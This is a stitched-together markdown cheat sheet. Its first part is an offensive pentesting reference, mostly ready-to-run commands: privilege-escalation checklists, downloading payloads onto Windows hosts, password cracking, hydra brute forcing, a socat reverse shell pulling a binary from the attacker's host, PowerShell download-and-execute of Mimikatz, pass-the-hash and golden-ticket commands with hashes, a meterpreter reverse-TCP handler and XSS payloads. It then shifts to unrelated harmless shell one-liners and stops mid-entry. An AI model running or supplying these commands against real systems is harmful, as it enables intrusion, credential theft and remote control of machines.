search for response on HTML source code

### Kernel Exploits

Linux: https://github.com/lucyoa/kernel-exploits Windows: https://github.com/abatchy17/WindowsExploits

### Linux Privilege Escalation

- sudo -l - Kernel Exploits - OS Exploits - Password reuse (mysql, .bash_history, 000-default.conf...) - Known binaries with suid flag and interactive (nmap) - Custom binaries with suid flag either using other binaries or with command execution - Writable files owned by root that get executed (cronjobs) - MySQL as root - Vulnerable services (chkrootkit, logrotate) - Writable /etc/passwd - Readable .bash_history - SSH private key - Listening ports on localhost - /etc/fstab - /etc/exports - /var/mail - Process as other user (root) executing something you have permissions to modify - SSH public key + Predictable PRNG - apt update hooking (Pre-Invoke)

### Windows Privilege Escalation

- Kernel Exploits - OS Exploits - Pass The Hash - Password reuse - DLL hijacking (Path) - Vulnerable services - Writable services binaries path - Unquoted services - Listening ports on localhost - Registry keys

### Windows File Transfer

**bitsadmin** `bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php` **cscript wget.vbs (code on the repo)** `cscript wget.vbs http://<ip>/test.txt test.txt` **powershell** `powershell -c "(new-object System.Net.WebClient).Downloadfile('http://<ip>/exploit.exe', 'C:\Windows\temp\exploit.txt')"` **ftp** client:

<pre>echo open <ip>2121 > ftpscript.txt
echo anonymous>> ftpscript.txt
echo PASS >> ftpscript.txt
echo bin >> ftpscript.txt
echo get meter.exe>> ftpscript.txt
echo quit >> ftpscript.txt
ftp -s:ftpscript.txt</ip> </pre>

server: `python -m pyftpdlib --port=2121 --write` **wget.exe** Upload to vulnerable server from kali: ` /usr/share/windows-binaries/wget.exe` `wget.exe http://<ip>/file file` **certutil** `certutil -urlcache -split -f https://<ip>/file.txt file.txt`

### Password Cracking

**zip** `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip ` **/etc/shadow**

<pre>unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
</pre>

**keepass**

<pre>keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file
</pre>

### HTTP Brute Force

**wfuzz POST** ```wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php``` **hydra POST** ```hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20``` **wfuzz NTLM** ```wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api``` **wfuzz Basic Auth through Proxy** ```wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/```

### TCP over HTTP

For this technique, it is necessary to be able to upload a file to a webserver. **1\. reGeorg** File upload to the server correct ![regeorge2](https://user-images.githubusercontent.com/7115563/33883424-028c9f0e-df3c-11e7-9559-b35667ae76db.png) Tunnel creation `python reGeorgSocksProxy.py -p 5555 -u "http://<ip>/admin/uploads/reGeorg.jsp"` Proxychains config ![regeorge1](https://user-images.githubusercontent.com/7115563/33883419-fcc15416-df3b-11e7-89a9-499ffc1de9cf.png)

<pre>proxychains nmap -F -sT 127.0.0.1
proxychains mysql -u root -p -h 127.0.0.1
proxychains ssh localhost
</pre>

![regeorge3](https://user-images.githubusercontent.com/7115563/33883422-017021fe-df3c-11e7-8f99-f02de5084c02.png) Reference: https://sensepost.com/discover/tools/reGeorg/ **2\. ABBTTS** Upload File ![abbtts5](https://user-images.githubusercontent.com/7115563/33883774-6d249ffa-df3d-11e7-9f3f-68bf1e70465f.png) Config proxychains and create the tunnel ```python abpttsclient.py -c tomcat_walkthrough/config.txt -u http://192.168.1.128/abptts.jsp -f 127.0.0.1:22222/127.0.0.1:22``` Usage ```ssh -p 22222 user@127.0.0.1``` ![abbtts7](https://user-images.githubusercontent.com/7115563/33883891-dc2f3c70-df3d-11e7-84e9-ebd9eab9ebee.png) Reference: https://github.com/nccgroup/ABPTTS

### Interactive Reverse Shell

Attacker: ```socat file:`tty`,raw,echo=0 TCP-L:4444``` Victim: ```wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444``` Socat Binary: https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

### Windows

**Bypass Applocker** **1\. rundll32** ```rundll32.exe PowerShdll.dll,main``` ![applocker](https://user-images.githubusercontent.com/7115563/34455568-dfe7d7c6-ed81-11e7-9869-de2d4e92f3aa.png) Reference: https://github.com/p3nt4/PowerShdll **2\. Alternative powershell files** ![applocker2](https://user-images.githubusercontent.com/7115563/34455569-e0136c6a-ed81-11e7-9b0e-127ae9d395e0.png) ```C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise``` **Runas Powershell** ```Start-Process powershell.exe -Verb runas``` ```Start-Process powershell.exe -Credential <user>``` **View Shares With Permissions**

<pre>powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"</pre>

![image](https://user-images.githubusercontent.com/7115563/34455620-34f292b4-ed83-11e7-92b0-3b8dd387146f.png) **View files that contain certain words recursively**

<pre> ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*
admin*","*secret*" -Recurse </pre>

![image](https://user-images.githubusercontent.com/7115563/34455641-aa03adf4-ed83-11e7-8333-a69366714921.png) **View files which name contains certain words recursively**

<pre>ls -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse</pre>

![image](https://user-images.githubusercontent.com/7115563/34455649-dcc941ea-ed83-11e7-9428-a702f254e807.png) **Connect to MSSQL Database**

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')

Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password <password>-Query "exec sp_databases"</password> </pre>

**Port Scanning**

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')

Invoke-Portscan -Hosts <ip>  -TopPorts 50</ip></pre>

![image](https://user-images.githubusercontent.com/7115563/34455679-6e630230-ed84-11e7-995e-2eea1a6fc8dc.png) **View Domain Admins**

<pre> net groups /domain "Domain Admins"</pre>

![image](https://user-images.githubusercontent.com/7115563/34455690-9e648d78-ed84-11e7-9a84-9b335530a31e.png) **View Domain Controlers**

<pre>nltest /dclist: <domain></domain> </pre>

![image](https://user-images.githubusercontent.com/7115563/34455698-d1504074-ed84-11e7-85ad-c4bb196c9d44.png) **Invoke Mimikatz**

<pre>IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz</pre>

**Pass The Hash with Mimikatz**

<pre> Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'</pre>

**Generate Golden Ticket (Domain Admin Required)**

<pre>Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'</pre>

![image](https://user-images.githubusercontent.com/7115563/34455725-7230ee30-ed85-11e7-9333-16372355ce60.png) ![image](https://user-images.githubusercontent.com/7115563/34455734-89934d5c-ed85-11e7-960e-9659e099c9df.png)

<pre>Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"</pre>

![image](https://user-images.githubusercontent.com/7115563/34455745-9edd0360-ed85-11e7-84f0-6d62e621613b.png)

<pre>Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'</pre>

![image](https://user-images.githubusercontent.com/7115563/34455747-b285372a-ed85-11e7-9374-c481108db77e.png) ![image](https://user-images.githubusercontent.com/7115563/34455748-bb0512c6-ed85-11e7-8d40-b6516cf8b0f3.png) **Invoke a command Remotely**

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')

 Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\bitch.txt"
</pre>

**Invoke Mimikatz Remotely**

<pre>Invoke-WMIExec -Target SVHOST2  -Username Administrator
-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"</pre>

![image](https://user-images.githubusercontent.com/7115563/34455757-1f6aed1c-ed86-11e7-9415-595fa5e8d6e7.png) **Get Hashes**

<pre>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes</pre>

![image](https://user-images.githubusercontent.com/7115563/34455769-66cb31bc-ed86-11e7-846e-090647d8e32f.png) **Check Pass The Hash with multiple servers**

<pre>$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")

foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }

</pre>

![image](https://user-images.githubusercontent.com/7115563/34455798-0bdc77ec-ed87-11e7-9504-6b9ec6fc2a8d.png) References: https://www.hacklikeapornstar.com/

### Bypass VPN routing restrictions

<pre>openconnect vpnXXX02.XXXX.com -u XX -s vpn-slice XXX.46.0.0/16 hostname3 mantis=XXX.46.224.68</pre>

![vpn](https://user-images.githubusercontent.com/7115563/34785073-5f76d2ce-f630-11e7-9acb-2fbe9e74494b.png) Reference: https://github.com/dlenski/vpn-slice

### Man's Poor VPN

Traffic forward over SSH without needing to ```ssh -D <port>```

<pre>sshuttle -vr user@192.168.207.57 180.46.0.0/16</pre>

![shuttle2](https://user-images.githubusercontent.com/7115563/34785498-a0b5c8c0-f631-11e7-8f3d-75e0ade96275.png) Proof: ![mantis2](https://user-images.githubusercontent.com/7115563/34785499-a0e7d838-f631-11e7-869f-d6fcdc1051e9.png) Reference: http://teohm.com/blog/using-sshuttle-in-daily-work/</port></user></ip></ip></ip></ip></ip></ip></ip></ip></port></ip>

Download from apache directory list
wget -m -np http://eamos.pf.jcu.cz/amos/kat_inf/externi/

$ nmap -p- -oA nmap.tcp 192.168.66.129
$ nmap -sU -p- -oA nmap.udp 192.168.66.129

$ ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -e php -u 192.168.66.129

$ python -c `import pty; pty.spawn("/bin/sh")`
$ stty raw -echo

LinEnum.sh
linuxprivchecker.py
unixprivesc.sh


  ./dirsearch.py -u http://88.198.233.174:42272 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -r

  sqlmap -r /tmp/req.txt -v -a --level 4 --risk 3

hydra 88.198.233.174 -s 42159 http-form-post "/index.php:password=^PASS^:Invalid password!" -l '' -P /usr/share/wordlists/seclists/Passwords/rockyou-75.txt -t 10 -w 30 -o hydra-http-post-attack.txt

nmap -sS -A -PN -p- --script=http-title dontscanme.bro

hydra 88.198.233.174 -s 42181 http-form-post "/main/index.php:name1=^USER^&name2=^PASS^:Wrong Credentials baby!" -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/seclists/Passwords/rockyou-75.txt -t 10 -w 30 -o /tmp/hydra-http-post-attack.txt


http://185.45.192.228/xssChall/1.php?xss=%27;alert(String.fromCharCode(88,83,83))//%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E
http://185.45.192.228/xssChall/2.php?xss=images.jpeg%27onmouseover=%22alert(%27xxs%27)%22
http://185.45.192.228/xssChall/3.php?xss=<script>window.onload=function(){eval(window.atob('ZXZhbChhbGVydCgxKSk7Cg=='))}</script>


http://185.45.192.228/xssChall/5.php?xss=%22onmousemove=%22window[%27al\u0065rt%27](1337)%22

http://185.45.192.228/xssChall/6.php?xss=%27%3Cscript%3Ewindow.onload=function(){window[%27al\u0065rt%27](1337)}%3C/script%3E


gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -x '.php' -e -t 25

gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27   -e -t 25


use exploit/multi/handler
set PAYLOAD  php/meterpreter/reverse_tcp
set LHOST 10.10.17.29
set LPORT 5555
set ExitOnSession false
exploit -j -z

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.17.29 LPORT=5555> -f raw > shell.php

python -c 'import pty; pty.spawn("/bin/bash")'

###### Hack Mozilla Firefox address bar

In Firefox's address bar, you can limit results by typing special characters before or after your term:

- `^` - for matches in your browsing history
- `*` - for matches in your bookmarks.
- `%` - for matches in your currently open tabs.
- `#` - for matches in page titles.
- `@` - for matches in web addresses.

###### Chrome hidden commands

- `chrome://chrome-urls` - list of all commands
- `chrome://flags` - enable experiments and development features
- `chrome://interstitials` - errors and warnings
- `chrome://net-internals` - network internals (events, dns, cache)
- `chrome://network-errors` - network errors
- `chrome://net-export` - start logging future network activity to a file
- `chrome://safe-browsing` - safe browsing options
- `chrome://user-actions` - record all user actions
- `chrome://restart` - restart chrome
- `chrome://dino` - ERR_INTERNET_DISCONNECTED...
- `cache:<website-address>` - view the cached version of the web page

###### Bypass WAFs by Shortening IP Address (by [0xInfection](https://twitter.com/0xInfection))

IP addresses can be shortened by dropping the zeroes:

```
http://1.0.0.1  http://1.1
http://127.0.0.1  http://127.1
http://192.168.0.1  http://192.168.1

http://0xC0A80001 or http://3232235521  192.168.0.1
http://192.168.257  192.168.1.1
http://192.168.516  192.168.2.4
```

  > This bypasses WAF filters for SSRF, open-redirect, etc where any IP as input gets blacklisted.

For more information please see [How to Obscure Any URL](http://www.pc-help.org/obscure.htm) and [Magic IP Address Shortcuts](https://stuff-things.net/2014/09/25/magic-ip-address-shortcuts/).

###### Hashing, encryption and encoding (by [Michal paek](https://twitter.com/spazef0rze))

_Hashing_

plaintext :arrow_right: hash<br>
hash :no_entry: plaintext

_Symmetric encryption_

plaintext :arrow_right: :key: :arrow_right: ciphertext<br>
plaintext :arrow_left: :key: :arrow_left: ciphertext<br>
(:key: shared key)

_Asymmetric encryption_

plaintext :arrow_right: :key: :arrow_right: ciphertext<br>
plaintext :arrow_left: :part_alternation_mark: :arrow_left: ciphertext<br>
(:key: public key, :part_alternation_mark: private key)<br>

_Encoding_

text :arrow_right: encoded<br>
text :arrow_left: encoded


# Useful commands By [@climagic](https://twitter.com/climagic)

- See who's on the Starbucks...

```Bash
  tshark -ni en0 -Y "bootp.option.type == 53" -T fields -e bootp.option.hostname -e eth.src_resolved
```

- Stop the execution of pid 5149. Same as if you pressed Ctrl-Z in the shell. Resume execution with kill -CONT 5149

```Bash
 kill -STOP 5149
```

- Find world readable files under CWD that have "password=" in them

```Bash
 find . -type f -perm /o=r -print0 | xargs -0 grep -l password=
```

- Random curses

```Bash
#!/usr/bin/python
import curses as c
import random as r
s = c.initscr()
w = c.newwin(3,7,9,9)
w.border()
while 1:
    c = s.getch()
    if (c == 32): # Press Spacebar
        w.mvwin(r.randint(2,25),r.randint(2,70))
    w.addstr(1,1,"F@*K!")
    w.refresh()
```

- Next time your publishing friends say they can't use the command line, let them know about

```Bash
 https://t.co/XrfO5M9MbY
```

- The ? matches any one character in that place, * matches 0 or more of any character

```Bash
 ls -l 091?17*.jpg
```

- sshfs is a util that uses FUSE and SSH to mount a remote directory as a local one.

```Bash
Deb:  apt-get install sshfs
Mac OSX:  brew install sshfs
Red Hat:  yum install fuse-sshfs
Yes Arch too:  pacman -S sshfs

 sshfs user@remotehost: /remotedir localdir
```

- Sort data.csv by the 5th column's numeric values in descending order

```Bash
 sort -t, -k5nr data.csv | less
```

- Count how many times per second the word love is used on Twitter in real time.

```Bash
 t stream search -l love |pv -l  >/dev/null
```

- Forgot your pres. remote ? use your phone

```Bash
 ssh machine "while read -r; do DISPLAY=:0 xdotool getactivewindow key space; done
```

- Math properties of 0 and unset variables

(disclaimer: I received $0 for this tweet and have not "sold out")

```Bash
 echo $((you**IBM))
```

- Edit binary files in a vi like editor

```Bash
 bvi GANDALF.CHA
```

- Setup vim so that scrolling within a file will provide 5 lines of preceding context before the cursor

```Bash
 :set scrolloff=5
```

- Make your own spooky noises with sox

```Bash
 play -n synth sin 900 bend 0.3,800,1 bend 1.2,-150,1 trim 0 3.5 reverb -w
```

- Get the creation date of a domain. Happy anniversary Slashdot

```Bash
 whois slashdot.org | awk '/Creation Date/{print $NF}'
```

- Print the first 5 log lines from each day in syslog

```Bash
 awk 'a[$1 $2]++ < 5' /var/log/system.log
```

- Please watch my recent presentation on using awk to analyze logs from the @Bro_IDS

```Bash
 https://t.co/eAOg5uEehJ
```

- Print the longest line in quotes.txt

```Bash
 awk 'length > max { max=length;maxline=$0 } END { print maxline; }' quotes.txt
```

- Can't wait for the next paycheck? I made 100MB in 5 seconds working from the comfort of my own home

```Bash
 yum makecache fast
```

- Posting this just because it's so awesome. :-)

```Bash
 https://t.co/5NFbDt1gmF
```

- Generate line stats of a problem over time in old logs. FIXED

```Bash
 for i in log.{48..1}.gz ; do printf "$i\\t" ; zgrep problem $i | wc -l ; done
```

- Alt. way you can exclude items from a glob match is to expand the glob with Ctrl-x * and then just remove the items you don't want

```Bash
 [C-x] *
```

- Measure the disk space used by directories starting with a-m, skip exports dir

```Bash
 du -sh [a-m]*/ --exclude=export/
```

- Measure the disk space used by directories AND FILES starting with a-m, skip export dir

```Bash
 du -sh -I export [a-m]*
```

- Decode a hex encoded string

```Bash
 echo %42%65%20%63%61%72%65%66%75%6c%20%77%68%61%74%2f%68%6f%77%20%79%6f%75%20%64%65%63%6f%64%65%0a | xxd -p -r
```

- Show a list of the other candidates for an open source SMB service. Happy 25 Years Samba!

```Bash
 look . | egrep "^s.*m.*b" | egrep "^.{4,9}$
```

- Stats for most common DOW for these wav files between May and Sept

```Bash
 ls 2017-0[5-9]-??.wav |cut -c 1-11 |date -f- +%A |sort|uniq -c|sort -nr
```

- Base conversion: calculate binary 1101 ...

```Bash
 printf '%x\\n' $((2#1101))
```

- Please raise your bar for what you consider proof of pwn

```Bash
 clear ; printf "root@www.equifax.com # "; sleep 1 ; scrot -bu CanBeFaked.png
```

- This is an easy way to join a file into one line if you're in a hurry. Be careful with large data though, might truncate

```Bash
 xargs < file.txt
```

- compare folder contents and show the difference @climagic

```Bash
  diff -rq dir1 dir2
```

- This will load your key into the ssh-agent session so that you can login to hosts without requiring your passphrase each time

```Bash
 ssh-add
```

- Have more than one tmux sessions running? Start tmux first and this keystroke lets you choose other tmux sessions easily

```Bash
 [Ctrl-b] s
```

- Fixed headline for a @zackwhittaker article

```Bash
 elinks https://t.co/TOoyPwWBsx |sed -e 's/Apache Struts security flaw/the fact that/' |less
```

- Sometimes error text scrolls by too fast and you can't read it. Try sending STDOUT to /dev/null to see STDERR

```Bash
 column -t log > /dev/null
```

- Did you know that if your output from 'less' is a pipe, it behaves like cat

```Bash
 less log log.2 log.3 | grep " 404 " | more
```

- Sometimes in cases where columns are truncated, you can make them visible by passing output through cat

```Bash
 dpkg -l '*4.10.0*' | cat
```

- Run sudo on the last command in your history. Be careful though. <Up Arrow > & [Ctrl-a] sudo can be fast too and perhaps safer

```Bash
 sudo !!
```

- Infinite "music"

```Bash
 perl -e \'use bytes; for($t=0;;$t++){ print chr($t*(($t > >13|$t > >8)&30&$t > >4)); }\' | play -t raw -b8 -r8k -e un - vol 0.5
```

- "Infinite" data breach

```Bash
 while :;do rig |head -1 |tr \'\\n\' ,;echo $RANDOM{,,,,} |tr -d \' \' ;done |sed -r -e \'s/,(...)(..)(....).*/,\\1-\\2-\\3/\'
```

- 39 character infinite ASCII maze generator

```Bash
 grep -ao "[/\\\\]" /dev/urandom|tr -d \\\\n
```

- Pretend you are on a starship (Uses sox)

```Bash
 play -n -c1 synth whitenoise band -n 100 20 band -n 50 20 gain +30 fade h 1 86400 1
```

- Rename all non-hidden files under current directory by replacing spaces with underscores. Uses Larry Wall's 'rename

```Bash
 rename 's/ /_/g' *
```

- Create an alias for awk that includes your own custom awk functions

```Bash
 alias ohmyawk='awk -i ~/.awk/myfunctions'
```

- Show the most recent 20 lines of dmesg with the times converted to local human readable times

```Bash
 dmesg -T | tail -n20
```

- Bro_IDS cols by name in awk

```Bash
 awk -F\\\\t \'/^#fields/{for (i=2;i&lt;=NF;i++){bro[$i]=i-1}} {print $bro["=ts"] FS $bro["id.resp_h"]}\' http.log
```

- Remove all the exif metadata tags from photo.jpg to improve privacy before uploading. Thanks @dmpop

```Bash
 exiftool -all= photo.jpg
```

- If you can't make it to watch totality

```Bash
 stellarium --sky-date 20170821 --sky-time 14:27:00 --longitude 87.342581W --latitude 36.782564N
```

- Solve the basic arithmetic CAPTCHA

```Bash
 elinks -dump https://t.co/FfH8nmk7pB | awk -F: '/Math question:/{print $2}' | bc
```

- Get a list of 10/8 internal IPs showing up in col 3 or 4

```Bash
 awk '$3~/^src:10\\./{print $3};$4~/^dest:10\\./{print $4}' network.log |sort |uniq
```

- Poly synth. Press asdfghj. Uses sox

```Bash
 n=CDEFGAB;l=asdfghj;while read -n1 k;do x=$(tr $l $n < $k);play -qn synth pl ${x}3 fade 0 .7 & done
```

- Asked 5 years ago this month

```Bash
 elinks https://stackoverflow.com/questions/11828270/how-to-exit-the-vim-editor | grep viewed
```

- Maybe this is the problem. The vi man page doesn't even mention how to quit

```Bash
 man vi | grep -i quit
```

- Breakup large log by syslog month/day and recompress

```Bash
 zcat month.log.gz | awk \'{print $0 | "gzip -v9c > brokenup.log-"$1"_"$2".gz"}\'
```

- What speakers are not on the attendees list

```Bash
 comm -23 <(sort speaker.emails |tr A-Z a-z |uniq) <(sort attendee.emails |tr A-Z a-z |uniq)
```

- GNU

```Bash
 Geez, it sure does take a while for sort to print its help information." (Hint: It\'s --help)
```

- Format a list of emails so that when you paste them into Outlook (ugh!), it breaks them up into individual addrs

```Bash
 tr $'\\n' \\; < email-list
```

- Produce stats on how many images you took on each day, regardless of strange filenaming schemes

```Bash
 stat -c %y *.jpg | cut -c1-10 | uniq -c
```

- Produce stats on how many photos you took on each day to help find the ones in large batches

```Bash
 ls -1 20170*.JPG| cut -c1-8 | uniq -c
```

- Print out the total local disk space you are using. Thanks @inc002

```Bash
 df -lk | awk \'/^\\//{ SUM += $3 } END { print SUM/2**20 " GiB" }\'
```

- Get a list of instructors from a webpage

```Bash
 elinks -dump-width 1000 -dump https://t.co/Jd20vFLeRk | awk -F: '/Instructor/{print $2}'
```

- You can put this in your shell rc to *help* protect yourself *specifically* from :(){ :|:& };:

```Bash
 :(){ true; };readonly -f :
```

- Generate a list of the emails($3) of speakers($8) in an attendee file

```Bash
 awk -F\\\\t -v IGNORECASE=1 '$8~/speaker/{print $3}' attendees.tsv
```

- Use -D to create a SOCKS5 tunnel inside your SSH connection. Some programs (like a web browser) can use these

```Bash
 ssh -D 1917 you@remoteho.st
```

- Using a \\ before a command also turns off programmable auto tab completion when the extension is not recognized

```Bash
 \\mpg123 audio<TAB >
```

- cd with no arguments will return you to $HOME

```Bash
 cd
```

- Watch the Unix clock in style as it approaches 1.5 billion seconds.  >10 hours to go

```Bash
 while date +%s | figlet ; do sleep 1 ; clear ; done
```

- Backup pictures while on travel, but exclude larger RAW images for now

```Bash
 rsync -zav -e ssh . user@remote:europe-backup/ --exclude='*.CR2'
```

- Render #markdown in the shell.

```Bash
 function mdr() { pandoc $1 | lynx -stdin -dump }
```

- Kill process if its not updating files (5 min)

```Bash
 [[ $( find $HOME/output -type f -mmin -5 | wc -l ) -eq 0 ]] && pkill -f '/usr/bin/whatever'
```

- Using your group privilege, mount (removable drive) /dev/sdc1 as if it automounted with its name

```Bash
 udisksctl mount -b /dev/sdc1
```

- Check the weather for the next few days in Alexandria

```Bash
 curl http://wttr.in/Alexandria
```

- A "rainbow" in your shell

```Bash
 yes "$(seq 231 -1 16)" | while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .02; done
```

- Get YT autogen subtitles

```Bash
 youtube-dl --write-auto-sub -f 139 -o subtitles CUdwDEKlDrw; grep '<c.color' subtitles.en.vtt|sed 's/<[^ >]\\+ >//g'
```

- Print a list of all the classes defined in a #Java jar

```Bash
 jar tvf path/to/some.jar | awk '{print $NF}
```

- If your Linux device names are long enough that it wraps lines, try using -hP and pipe to column for nicer output

```Bash
 df -hP | column -t
```

- Randomware

```Bash
 dd if=/dev/random of=dont-run-this.bin bs=128 count=$RANDOM ; chmod a+x dont-run-this.bin
```

- Show how many emails are distinctly on the CTSC sw vuln list for @TrustedCI

```Bash
 comm -13 <(sort announce-inf-l) <(sort announce-sw-l) | wc -l
```

- Sed explained with examples

```Bash
 https://t.co/7ZyB9d2d2K
```

- Print the number and column name to help write awk expressions

```Bash
 head -1 data.csv | tr , $'\\n' | nl
```

- Use rlwrap to add readline functionality to nc (or other cmds). Thx rk[ghost] on

```Bash
 rlwrap nc smtp.example 25
```

- Pause execution of any process called render. As if you pressed Ctrl-Z in shell. Resume with 'killall -CONT render

```Bash
 killall -STOP render
```

- Finish a download started by a previous instance of wget, or even by another program. 56K respect

```Bash
 wget -c https://t.co/dEZYMEPAH5
```

- Tell the Linux kernel that there have been partition table changes. Great when running live after fdisk

```Bash
 sudo partprobe
```

- Find out what country/state/city an IP is probably "located" in. No browser required (geoip-bin dpkg)

```Bash
 geoiplookup 73.250.181.107
```

- How to "make" /dev/one (377 in octal is 0xFF hex or all 8 bits on, but you knew that :)

```Bash
 tr \'\\000\' \'\\377\' < /dev/zero
```

- For maps in your terminal from OpenStreetMap. Yes really. https://t.co/FckeNVD5Nm

```Bash
 telnet mapscii.me
```

- Another TUI program providing network statistics in the terminal. Thx @maxmeranda @hholst80 for reminding me about this cool command

```Bash
 bmon
```

- iptraf is a nice standalone real time network monitoring and stats utility for Linux that runs in the terminal

```Bash
 iptraf
```

- Force each dd command in the process table to output its current status (blocks written, etc). The USR1 signal does this

```Bash
 killall -USR1 dd
```

- Recover deleted files from /dev/sdc1. Right now I'm listening to "deleted" mp3s of Sigur Rs from a reused thumb drive

```Bash
 photorec /dev/sdc1
```

- Show a 3 month view (last month, current month, next month) in the Linux and FreeBSD versions of cal

```Bash
 cal -3
```

- Change less' binary view format to not use reverse video on 8-bit chars. Used this for a screenshot

```Bash
 LESSBINFMT="*n<%02X >" less /bin/ls
```

- Duo from two geolocations on the same date. k1=dateuser k2=geolocation

```Bash
 The last one prints cases where a user tries to authenticate to
```

- Print lines in log where epoch time (col 1) is before 8am or after 5pm EDT

```Bash
 awk '($1 % 86400 < 43200 || $1 % 86400 > 75600) {print}' log
```

- Change to /pub and then change back to the dir you were in before. Thanks for the drinks @jed & @laufers

```Bash
 cd /pub ; cd -
```

- World maps from OpenStreetMap right in your terminal w/ mouse support. Arrow keys & a/z to zoom, or mouse. Thx @adman_X

```Bash
 telnet mapscii\\.me
```

- There is something kinda fun about using your mouse scroll wheel in elinks from anywhere

```Bash
 elinks https://t.co/yBh9vXFUPq
```

- Print the Unicode emoticons block codes and symbols

```Bash
 for i in 1F6{0..4}{{0..9},{A..F}} ; do printf "\\\\\\\\U$i \\U$i\\n" ; done
```

- Some commands send their help output to STDERR, Using |& in BASH 4+ sends STDERR to STDIN of next command

```Bash
 snmpwalk -h |& grep OID
```

- TheUnixWay

```Bash
 If you happen to use @HipChat (like at work), did you know you can use s/find/replace/ in it just like in sed?
```

- 2 commands, 1 grep

```Bash
 { dig +short AAAA towel.blinkenlights\\.nl ; dig +short A towel.blinkenlights\\.nl; } | grep --color=always 42
```

- StarWars in ASCII. Also, towel!

```Bash
 telnet towel.blinkenlights\\.nl
```

- infosec https://t.co/V6ubXhDywL

```Bash
 [ Attacks Subtitle Parser ]
```

- Generate list of all authors in git repos under repos/

```Bash
 for repo in repos/* ; do git -C "$repo" log | grep ^Author: ; done | sort | uniq
```

- Function to shorten this commonly used command line pattern & allow for options for final sort

```Bash
 topuniq(){ sort|uniq -c|sort "${@:--rn}"; }
```

- Check fails from non-workplace

```Bash
 awk -F, \'$6=="FAILURE" && $10 == "US" && $12 !~ /(Walla Walla|Crystal Lake)/\' duo-authentication-report.csv
```

- ImageMagick's command 'animate' allows you to view animated gifs direct from the URL

```Bash
 animate http://climagic\\.org/images/rice-spinner.gif
```

- Add image to anim gif

```Bash
 convert spin.gif -coalesce -gravity NorthEast -draw \'image over 0,0 0,0 "credit.png"\' -layers Optimize spin2.gif
```

- Set the search jump target to 10 lines down so that you see 9 previous lines of context on searches within less

```Bash
 less -j10 /var/log/syslog
```

- You can use a bracketed command to pipe two find outputs into one tar

```Bash
 { find /one; find /two; } | tar zcvf one-and-two.tar.gz -T -
```

- 7zip can also list the contents of iso images and extract them too. No need to mount the image

```Bash
 7z l philip-glass-linux-0.8-minimal.iso
```

- Use stat to display numerical values for file permissions

```Bash
